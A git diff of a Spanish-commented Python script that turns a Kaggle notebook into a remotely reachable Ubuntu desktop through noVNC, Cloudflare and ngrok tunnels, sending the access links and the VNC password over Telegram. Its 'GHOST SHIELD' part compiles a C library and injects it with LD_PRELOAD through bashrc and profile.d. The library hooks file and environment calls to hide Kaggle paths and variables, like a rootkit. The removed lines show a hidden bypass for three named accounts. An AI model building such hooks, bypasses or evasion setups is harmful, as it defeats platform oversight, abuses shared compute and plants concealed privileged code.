@@ -598,7 +598,8 @@ if master_dataset_path and master_dataset_path.exists():
     
     # 4. Reutilizar noVNC pre-empaquetado si está presente
     print("  📦 [3/3] Configurando noVNC WebRTC y Google Chrome...", flush=True)
-    novnc_dir = Path("/kaggle/working/noVNC")
+    novnc_dir = Path("/opt/noVNC")
+    novnc_dir.parent.mkdir(parents=True, exist_ok=True)
     if not novnc_dir.exists():
         found_novnc = list(master_dataset_path.rglob("noVNC"))
         if found_novnc and found_novnc[0].is_dir():
@@ -607,9 +608,14 @@ if master_dataset_path and master_dataset_path.exists():
             except Exception:
                 pass
         if not novnc_dir.exists():
-            subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /kaggle/working/noVNC >> {LOG_FILE} 2>&1", shell=True)
-            subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /kaggle/working/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
-    subprocess.run("chmod -R +x /kaggle/working/noVNC/utils 2>/dev/null || true", shell=True)
+            subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1", shell=True)
+            subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
+    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)
+    try:
+        if not Path("/kaggle/working/noVNC").exists():
+            os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
+    except Exception:
+        pass
             
     # Instalar Google Chrome pre-empaquetado
     chrome_debs = list(master_dataset_path.rglob("google-chrome*.deb"))
@@ -660,10 +666,17 @@ else:
     print("  ✅ [✓] Suite Oficial de Ubuntu instalada con éxito.", flush=True)
 
 # Descargar noVNC si no existe
-novnc_dir = Path("/kaggle/working/noVNC")
+novnc_dir = Path("/opt/noVNC")
+novnc_dir.parent.mkdir(parents=True, exist_ok=True)
 if not novnc_dir.exists():
-    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /kaggle/working/noVNC >> {LOG_FILE} 2>&1", shell=True)
-    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /kaggle/working/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
+    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1", shell=True)
+    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1", shell=True)
+    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)
+    try:
+        if not Path("/kaggle/working/noVNC").exists():
+            os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
+    except Exception:
+        pass
 
 # Inyectar HUD Cyberpunk de 60 FPS & PING en tiempo real en la interfaz de noVNC
 try:
@@ -2243,9 +2256,13 @@ try:
         pass
 
     # --------------------------------------------------------------------------
-    # 6. GHOST SHIELD: Blindaje Criptográfico y User-Space C-Hooking (LD_PRELOAD)
+    # 6. GHOST SHIELD QUIRÚRGICO: Invisibilidad de Kaggle solo para Clientes en Terminal
     # --------------------------------------------------------------------------
     try:
+        # 1. Asegurar que NUNCA exista un ld.so.preload global que rompa demonios del sistema
+        if Path("/etc/ld.so.preload").exists():
+            Path("/etc/ld.so.preload").unlink(missing_ok=True)
+
         ghost_c = Path("/tmp/libghost_shield.c")
         ghost_so = Path("/usr/local/lib/libghost_shield.so")
         ghost_code = """#define _GNU_SOURCE
@@ -2259,6 +2276,8 @@ try:
 #include <fcntl.h>
 #include <unistd.h>
 #include <stdarg.h>
+
+extern char *program_invocation_short_name;
 
 static struct dirent *(*orig_readdir)(DIR *) = NULL;
 static int (*orig_stat)(const char *, struct stat *) = NULL;
@@ -2280,49 +2299,28 @@ static void init_hooks(void) {
     if (!orig_getenv) orig_getenv = dlsym(RTLD_NEXT, "getenv");
 }
 
-// Hash criptografico rapido para no dejar texto en claro en binarios
-static unsigned long long djb2_h(const char *str) {
-    if (!str) return 0;
-    unsigned long long hash = 5381;
-    int c;
-    while ((c = *str++)) hash = ((hash << 5) + hash) + c;
-    return hash;
-}
-
-// -----------------------------------------------------------------------------
-// VERIFICADOR DE EXCEPCIONES: 3 CUENTAS MAESTRAS (PROTECCION HASH 64-BIT)
-// -----------------------------------------------------------------------------
-static int is_master_admin(void) {
-    const char *admin_mode = orig_getenv ? orig_getenv("MASTER_ADMIN_MODE") : getenv("MASTER_ADMIN_MODE");
-    if (admin_mode && strcmp(admin_mode, "1") == 0) return 1;
-
-    const char *key = orig_getenv ? orig_getenv("KAGGLE_KEY") : getenv("KAGGLE_KEY");
-    const char *user = orig_getenv ? orig_getenv("KAGGLE_USERNAME") : getenv("KAGGLE_USERNAME");
-
-    unsigned long long h_u = djb2_h(user);
-    unsigned long long h_k = djb2_h(key);
-
-    // Excepcion 1: djkevinzito@gmail.com / miguelguerra26
-    if (h_u == 0x4f895b3e67704296ULL || h_k == 0x67a0e56fa719be2eULL) return 1;
-
-    // Excepcion 2: miguelguerra200022@gmail.com / miguelguerra22
-    if (h_u == 0x4f895b3e67704292ULL || h_k == 0x8f8f0ca2b432b516ULL) return 1;
-
-    // Excepcion 3: 2026liam2000@gmail.com / miguel55755 (Kaggle.txt)
-    if (h_u == 0xc0b0176e92e46d33ULL || h_k == 0x85560191b86dc5d9ULL) return 1;
-
+// Lista blanca: Demonios del sistema que NUNCA deben ser bloqueados
+static int is_system_daemon(void) {
+    if (!program_invocation_short_name) return 0;
+    const char *n = program_invocation_short_name;
+    if (strcmp(n, "novnc_proxy") == 0 || strcmp(n, "websockify") == 0 ||
+        strcmp(n, "x11vnc") == 0 || strcmp(n, "Xvfb") == 0 ||
+        strcmp(n, "python3") == 0 || strcmp(n, "python") == 0 ||
+        strcmp(n, "cloudflared") == 0 || strcmp(n, "nginx") == 0 ||
+        strcmp(n, "sunshine") == 0 || strcmp(n, "rclone") == 0) {
+        return 1;
+    }
     return 0;
 }
 
 static int is_kaggle_target(const char *path) {
-    if (is_master_admin()) return 0; // Bypass para las 3 cuentas maestras
+    if (is_system_daemon()) return 0; // Demonios tienen acceso total
     if (!path) return 0;
-    if (strcmp(path, "kaggle") == 0) return 1;
-    if (strcmp(path, ".kaggle") == 0) return 1;
-    if (strcmp(path, "/kaggle") == 0) return 1;
-    if (strncmp(path, "/kaggle/", 8) == 0) return 1;
-    if (strstr(path, "/kaggle") != NULL) return 1;
-    if (strstr(path, "/.kaggle") != NULL) return 1;
+    // Ocultar directorios raíz de Kaggle para clientes
+    if (strcmp(path, "kaggle") == 0 || strcmp(path, ".kaggle") == 0) return 1;
+    if (strcmp(path, "/kaggle") == 0 || strcmp(path, "/kaggle/") == 0) return 1;
+    if (strncmp(path, "/kaggle/input", 13) == 0) return 1;
+    if (strncmp(path, "/kaggle/lib", 11) == 0) return 1;
     return 0;
 }
 
@@ -2401,7 +2399,7 @@ int openat(int dirfd, const char *pathname, int flags, ...) {
 
 char *getenv(const char *name) {
     if (!orig_getenv) init_hooks();
-    if (is_master_admin()) return orig_getenv(name);
+    if (is_system_daemon()) return orig_getenv(name);
     if (name && strncasecmp(name, "KAGGLE", 6) == 0) {
         return NULL;
     }
@@ -2410,11 +2408,24 @@ char *getenv(const char *name) {
 """
         ghost_c.write_text(ghost_code, encoding="utf-8")
         subprocess.run(f"gcc -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null || clang -fPIC -shared -O2 {ghost_c} -o {ghost_so} -ldl 2>/dev/null", shell=True)
-        if ghost_so.exists():
-            preload_file = Path("/etc/ld.so.preload")
-            current_preload = preload_file.read_text() if preload_file.exists() else ""
-            if str(ghost_so) not in current_preload:
-                preload_file.write_text((current_preload + "\n" + str(ghost_so)).strip() + "\n", encoding="utf-8")
+        
+        # Inyectar LD_PRELOAD SOLAMENTE en sesiones de terminal interactivas (cuando hay un usuario abriendo consola)
+        terminal_env = (
+            "\n# Blindaje de Terminal Cloud Workstation (Solo en modo interactivo)\n"
+            "if [ -t 0 ] || [ -t 1 ]; then\n"
+            "    export LD_PRELOAD='/usr/local/lib/libghost_shield.so'\n"
+            "fi\n"
+        )
+        Path("/etc/profile.d/terminal_privacy.sh").write_text(terminal_env, encoding="utf-8")
+        for brc in ["/root/.bashrc", "/etc/skel/.bashrc"]:
+            try:
+                p_brc = Path(brc)
+                if p_brc.exists():
+                    c_txt = p_brc.read_text(encoding="utf-8", errors="ignore")
+                    if "terminal_privacy" not in c_txt:
+                        p_brc.write_text(c_txt + terminal_env, encoding="utf-8")
+            except Exception:
+                pass
     except Exception:
         pass
 
@@ -2754,82 +2765,78 @@ if not vnc_ready:
     subprocess.Popen(["x11vnc", "-display", ":1", "-forever", "-shared", "-rfbport", "5900", "-bg"] + cmd_vnc_auth, env=env, stdout=log_vnc, stderr=log_vnc)
     vnc_ready = wait_for_port(5900, timeout=5)
 
-# Asegurar permisos de ejecución en toda la suite noVNC
-novnc_proxy_bin = Path("/kaggle/working/noVNC/utils/novnc_proxy")
-if not novnc_proxy_bin.exists():
-    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /kaggle/working/noVNC >> {LOG_FILE} 2>&1 || true", shell=True)
-    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /kaggle/working/noVNC/utils/websockify >> {LOG_FILE} 2>&1 || true", shell=True)
-subprocess.run("chmod -R +x /kaggle/working/noVNC/utils 2>/dev/null || true", shell=True)
+# Asegurar que noVNC esté instalado en /opt/noVNC (Ruta oficial fuera de /kaggle)
+novnc_dir = Path("/opt/noVNC")
+if not (novnc_dir / "utils/novnc_proxy").exists():
+    novnc_dir.parent.mkdir(parents=True, exist_ok=True)
+    subprocess.run(f"git clone --depth 1 https://github.com/novnc/noVNC.git /opt/noVNC >> {LOG_FILE} 2>&1 || true", shell=True)
+    subprocess.run(f"git clone --depth 1 https://github.com/novnc/websockify /opt/noVNC/utils/websockify >> {LOG_FILE} 2>&1 || true", shell=True)
+    subprocess.run("chmod -R +x /opt/noVNC/utils 2>/dev/null || true", shell=True)
 
-# Servidor Web noVNC y Gateway Unificado (Puerto 6080)
-# Intentar primero Nginx para unificar / (noVNC en 6082) y /gamepad (WebSocket en 6081)
-novnc_running = False
+# Symlink retrocompatible en /kaggle/working/noVNC
+try:
+    if not Path("/kaggle/working/noVNC").exists():
+        os.symlink("/opt/noVNC", "/kaggle/working/noVNC")
+except Exception:
+    pass
 
-# 1. Iniciar noVNC en puerto interno 6082
+# Servidor Web noVNC (Puerto 6080 Directo — Resiliente y sin intermediarios)
+log("Iniciando noVNC directo en puerto 6080...")
+subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
+time.sleep(0.5)
+
 subprocess.Popen([
-    "/kaggle/working/noVNC/utils/novnc_proxy",
+    "/opt/noVNC/utils/novnc_proxy",
     "--vnc", "127.0.0.1:5900",
-    "--listen", "6082",
-    "--web", "/kaggle/working/noVNC"
+    "--listen", "6080",
+    "--web", "/opt/noVNC"
 ], env=env, stdout=log_vnc, stderr=log_vnc)
-novnc_6082 = wait_for_port(6082, timeout=8)
 
-# 2. Si Nginx está disponible y 6082 está listo, levantar Nginx en 6080
-if novnc_6082 and shutil.which("nginx"):
-    try:
-        subprocess.run("killall -9 nginx 2>/dev/null || true", shell=True)
-        Path("/var/log/nginx").mkdir(parents=True, exist_ok=True)
-        Path("/run").mkdir(parents=True, exist_ok=True)
-        nginx_conf = (
-            "user root;\n"
-            "worker_processes auto;\n"
-            "pid /run/nginx.pid;\n"
-            "error_log /var/log/nginx/error.log warn;\n"
-            "events { worker_connections 1024; }\n"
-            "http {\n"
-            "  include /etc/nginx/mime.types;\n"
-            "  default_type application/octet-stream;\n"
-            "  sendfile on;\n"
-            "  access_log off;\n"
-            "  server {\n"
-            "    listen 6080 default_server;\n"
-            "    location /gamepad {\n"
-            "      proxy_pass http://127.0.0.1:6081;\n"
-            "      proxy_http_version 1.1;\n"
-            "      proxy_set_header Upgrade $http_upgrade;\n"
-            "      proxy_set_header Connection \"upgrade\";\n"
-            "      proxy_read_timeout 86400s;\n"
-            "    }\n"
-            "    location / {\n"
-            "      proxy_pass http://127.0.0.1:6082;\n"
-            "      proxy_http_version 1.1;\n"
-            "      proxy_set_header Upgrade $http_upgrade;\n"
-            "      proxy_set_header Connection \"upgrade\";\n"
-            "      proxy_read_timeout 86400s;\n"
-            "    }\n"
-            "  }\n"
-            "}\n"
-        )
-        Path("/etc/nginx/nginx.conf").write_text(nginx_conf, encoding="utf-8")
-        subprocess.run("nginx 2>/dev/null || true", shell=True)
-        if wait_for_port(6080, timeout=4):
-            novnc_running = True
-            log("Gateway Nginx activo: noVNC + Gamepad unificados en puerto 6080")
-    except Exception as e_ng:
-        log(f"Aviso Nginx: {e_ng}", "WARNING")
-
-# 3. Fallback Infalible: Si Nginx no abrió el puerto 6080, levantar noVNC directamente en 6080
-if not novnc_running:
-    subprocess.run("killall -9 nginx 2>/dev/null || true", shell=True)
+novnc_ready = wait_for_port(6080, timeout=12)
+if not novnc_ready:
+    log("Reintentando arranque de noVNC en 6080...", "WARNING")
+    subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
+    time.sleep(1)
     subprocess.Popen([
-        "/kaggle/working/noVNC/utils/novnc_proxy",
+        "/opt/noVNC/utils/novnc_proxy",
         "--vnc", "127.0.0.1:5900",
         "--listen", "6080",
-        "--web", "/kaggle/working/noVNC"
+        "--web", "/opt/noVNC"
     ], env=env, stdout=log_vnc, stderr=log_vnc)
     novnc_ready = wait_for_port(6080, timeout=10)
-else:
-    novnc_ready = True
+
+# Verificación HTTP Real de respuesta local 200 en puerto 6080
+port6080_http_ok = False
+if novnc_ready:
+    import urllib.request
+    for _ in range(8):
+        try:
+            with urllib.request.urlopen("http://127.0.0.1:6080/vnc.html", timeout=3) as resp:
+                if resp.status == 200:
+                    port6080_http_ok = True
+                    log("Puerto local 6080 verificado con HTTP 200 OK", "SUCCESS")
+                    break
+        except Exception:
+            time.sleep(0.5)
+
+# Watchdog en segundo plano: Si el puerto 6080 cae, revivirlo automáticamente
+def watchdog_novnc_loop():
+    while True:
+        time.sleep(25)
+        if not wait_for_port(6080, timeout=2):
+            log("WATCHDOG: Puerto 6080 caído. Reiniciando noVNC automáticamente...", "WARNING")
+            subprocess.run("pkill -9 -f 'novnc_proxy|websockify' 2>/dev/null || true", shell=True)
+            time.sleep(0.5)
+            subprocess.Popen([
+                "/opt/noVNC/utils/novnc_proxy",
+                "--vnc", "127.0.0.1:5900",
+                "--listen", "6080",
+                "--web", "/opt/noVNC"
+            ], env=env, stdout=log_vnc, stderr=log_vnc)
+            wait_for_port(6080, timeout=8)
+
+import threading
+threading.Thread(target=watchdog_novnc_loop, daemon=True).start()
 
 # Auto-iniciar Sunshine (Servidor GameStream / Moonlight para Gaming 60 FPS con aceleración GPU)
 sunshine_bin = shutil.which("sunshine")
@@ -2848,63 +2855,77 @@ if sunshine_bin:
 print(f"  ⏱️ [Paso 4/5 Completado en {time.time() - t_step4:.1f}s]", flush=True)
 
 # ==============================================================================
-# 5. TÚNELES DE ALTA VELOCIDAD Y AUTO-RECONEXIÓN RESILIENTE
+# 5. TÚNELES DE ALTA VELOCIDAD Y VERIFICACIÓN HTTP REAL (CERO 502)
 # ==============================================================================
 t_step5 = time.time()
-print("🌐 [5/5] Conectando túneles de acceso remoto con auto-reconexión...", flush=True)
+print("🌐 [5/5] Conectando túneles de acceso remoto verificados...", flush=True)
 
 web_tunnel_wifi = None
 web_tunnel_mobile = None
 vnc_app_address = []
 
-ngrok_token = os.environ.get("NGROK_TOKEN", "").strip()
-if len(sys.argv) > 1 and sys.argv[1].strip() and sys.argv[1].strip() != "SIN_TOKEN" and not sys.argv[1].startswith("--"):
-    ngrok_token = sys.argv[1].strip()
-if not ngrok_token:
-    ngrok_token = DEFAULT_NGROK
+# 1. Cloudflare Tunnel PRIMERO (Directo y verificado contra puerto 6080)
+try:
+    cf_bin = Path("/usr/local/bin/cloudflared")
+    if not cf_bin.exists():
+        subprocess.run("wget -q --timeout=15 https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared 2>/dev/null && chmod +x /usr/local/bin/cloudflared || true", shell=True)
+    if cf_bin.exists():
+        proc_cf = subprocess.Popen(["cloudflared", "tunnel", "--url", "http://127.0.0.1:6080"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
+        for _ in range(40):
+            line = proc_cf.stdout.readline()
+            if not line:
+                time.sleep(0.3)
+                continue
+            if "trycloudflare.com" in line:
+                match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
+                if match:
+                    base_cf = match.group(1).strip()
+                    # Verificación HTTP Real del endpoint público (Asegura CERO 502)
+                    clean_test_url = f"{base_cf}/vnc.html"
+                    cf_ok = False
+                    import urllib.request
+                    for _ in range(12):
+                        try:
+                            with urllib.request.urlopen(clean_test_url, timeout=4) as test_resp:
+                                if test_resp.status == 200:
+                                    cf_ok = True
+                                    log(f"Túnel Cloudflare verificado exitosamente con HTTP 200: {base_cf}", "SUCCESS")
+                                    break
+                        except Exception:
+                            time.sleep(1)
+                    
+                    if cf_ok:
+                        web_tunnel_wifi = f"{base_cf}/vnc.html?autoconnect=true&resize=scale&quality=9&compression=1&password={VNC_PASSWORD}"
+                        web_tunnel_mobile = f"{base_cf}/vnc.html?autoconnect=true&resize=scale&quality=6&compression=6&reconnect=true&password={VNC_PASSWORD}"
+                    else:
+                        log("Cloudflare no respondió HTTP 200 en tiempo. Intentando fallback.", "WARNING")
+                    break
+except Exception as e_cf:
+    log(f"Aviso Cloudflare: {e_cf}", "WARNING")
 
-# 1. Túnel Web Ngrok HTTP en pantalla completa (Región US para mínima latencia a Venezuela)
-if ngrok_token:
-    try:
-        from pyngrok import ngrok, conf
+# 2. Fallback Ngrok si Cloudflare no estuviera disponible
+if not web_tunnel_wifi:
+    ngrok_token = os.environ.get("NGROK_TOKEN", "").strip()
+    if len(sys.argv) > 1 and sys.argv[1].strip() and sys.argv[1].strip() != "SIN_TOKEN" and not sys.argv[1].startswith("--"):
+        ngrok_token = sys.argv[1].strip()
+    if not ngrok_token:
+        ngrok_token = DEFAULT_NGROK
+    if ngrok_token:
         try:
-            ngrok.kill()
-        except Exception:
-            pass
-        ngrok.set_auth_token(ngrok_token)
-        conf.get_default().region = "us"
-        try:
+            from pyngrok import ngrok, conf
+            try:
+                ngrok.kill()
+            except Exception:
+                pass
+            ngrok.set_auth_token(ngrok_token)
+            conf.get_default().region = "us"
             http_tunnel = ngrok.connect(6080, "http")
             base_ngrok = http_tunnel.public_url
             web_tunnel_wifi = f"{base_ngrok}/vnc.html?autoconnect=true&resize=scale&quality=9&compression=1&password={VNC_PASSWORD}"
             web_tunnel_mobile = f"{base_ngrok}/vnc.html?autoconnect=true&resize=scale&quality=6&compression=6&reconnect=true&password={VNC_PASSWORD}"
+            log(f"Túnel Ngrok activo: {base_ngrok}", "SUCCESS")
         except Exception as e_ngrok:
-            log(f"Ngrok endpoint ocupado o aviso: {e_ngrok}", "WARNING")
-    except Exception as e:
-        log(f"Aviso Ngrok HTTP: {e}", "WARNING")
-
-# 1.5 Fallback de Alta Velocidad: Cloudflare Tunnel (Anycast Global) si Ngrok no conectó
-if not web_tunnel_wifi:
-    try:
-        cf_bin = Path("/usr/local/bin/cloudflared")
-        if not cf_bin.exists():
-            subprocess.run("wget -q https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-linux-amd64 -O /usr/local/bin/cloudflared 2>/dev/null && chmod +x /usr/local/bin/cloudflared || true", shell=True)
-        if cf_bin.exists():
-            proc_cf = subprocess.Popen(["cloudflared", "tunnel", "--protocol", "quic", "--edge-ip-version", "auto", "--url", "http://127.0.0.1:6080"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
-            for _ in range(30):
-                line = proc_cf.stdout.readline()
-                if not line:
-                    time.sleep(0.3)
-                    continue
-                if "trycloudflare.com" in line:
-                    match = re.search(r'(https://[a-zA-Z0-9-]+\.trycloudflare\.com)', line)
-                    if match:
-                        base_cf = match.group(1).strip()
-                        web_tunnel_wifi = f"{base_cf}/vnc.html?autoconnect=true&resize=scale&quality=9&compression=1&password={VNC_PASSWORD}"
-                        web_tunnel_mobile = f"{base_cf}/vnc.html?autoconnect=true&resize=scale&quality=6&compression=6&reconnect=true&password={VNC_PASSWORD}"
-                        break
-    except Exception as e_cf:
-        log(f"Aviso Cloudflare: {e_cf}", "WARNING")
+            log(f"Aviso Ngrok: {e_ngrok}", "WARNING")
 
 # Guardar URL de sesión en Google Drive para acceso instantáneo remoto
 if web_tunnel_wifi:
@@ -2923,11 +2944,11 @@ if web_tunnel_wifi:
             telegram_script = Path(__file__).resolve().parent / "telegram_notifier.py"
             if telegram_script.exists():
                 msg_tg = (
-                    f"🚀 <b>¡Tu Ubuntu Cloud PC está ONLINE!</b> 🌸\n\n"
-                    f"👉 <b>WiFi:</b> <a href='{web_tunnel_wifi}'>Entrar a Ubuntu</a>\n"
+                    f"🚀 <b>¡Tu Ubuntu Cloud PC está ONLINE y VERIFICADA!</b> 🌸\n\n"
+                    f"👉 <b>WiFi:</b> <a href='{web_tunnel_wifi}'>Entrar a Ubuntu (HTTP 200 OK)</a>\n"
                     f"📱 <b>Móvil:</b> <a href='{web_tunnel_mobile}'>Modo Móvil</a>\n"
                     f"🔑 <b>Pass:</b> <code>{VNC_PASSWORD}</code>\n"
-                    f"🎮 <i>Mandos táctiles y menú lateral Starparks activos.</i>"
+                    f"🎮 <i>Mandos táctiles, menú lateral Starparks y Watchdog 6080 activos.</i>"
                 )
                 import telegram_notifier
                 telegram_notifier.enviar_mensaje(msg_tg)
@@ -3137,7 +3158,7 @@ try:
             auto_save_user_state()
             try:
                 ram_str = subprocess.check_output("free -h | grep Mem: | awk '{print $3 \"/\" $2}'", shell=True, text=True).strip()
-                disk_str = subprocess.check_output("df -h /kaggle/working | tail -1 | awk '{print $4 \" libres\"}'", shell=True, text=True).strip()
+                disk_str = subprocess.check_output("df -h / 2>/dev/null | tail -1 | awk '{print $4 \" libres\"}'", shell=True, text=True).strip()
                 gpu_info = ""
                 try:
                     gpu_lines = subprocess.check_output("nvidia-smi --query-gpu=index,utilization.gpu,memory.used,memory.total --format=csv,noheader,nounits 2>/dev/null", shell=True, text=True).strip().splitlines()
